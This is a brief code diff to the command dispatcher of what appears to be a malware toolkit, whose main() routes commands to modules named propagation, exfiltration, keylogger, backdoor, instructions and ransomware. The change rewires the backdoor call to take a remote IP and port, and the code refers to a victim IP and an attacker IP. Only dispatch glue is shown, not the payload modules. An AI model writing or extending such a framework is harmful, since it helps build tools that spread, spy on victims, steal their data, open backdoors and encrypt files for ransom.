@@ -52,7 +52,7 @@ def main():
         "propagation": propagation.run,
         "exfiltration": exfiltration.run,
         "keylogger": keylogger.run,
-        "backdoor": backdoor.run,
+        "backdoor": lambda victim_ip, port: backdoor.run(victim_ip, port),
         "instructions": lambda victim_ip: instructions.run(victim_ip),
         "ransomware": ransomware.run,
     }
@@ -79,8 +79,7 @@ def main():
 
             elif result[0] == "backdoor":
                 if len(result) >= 3:
-                    if result[1] == "start":
-                        backdoor.run(attacker_ip=result[2])
+                    backdoor.run(remote_ip=result[1], remote_port=result[2])
 
             elif result[0] == "ransomware":
                 if result[1] == "encrypt":
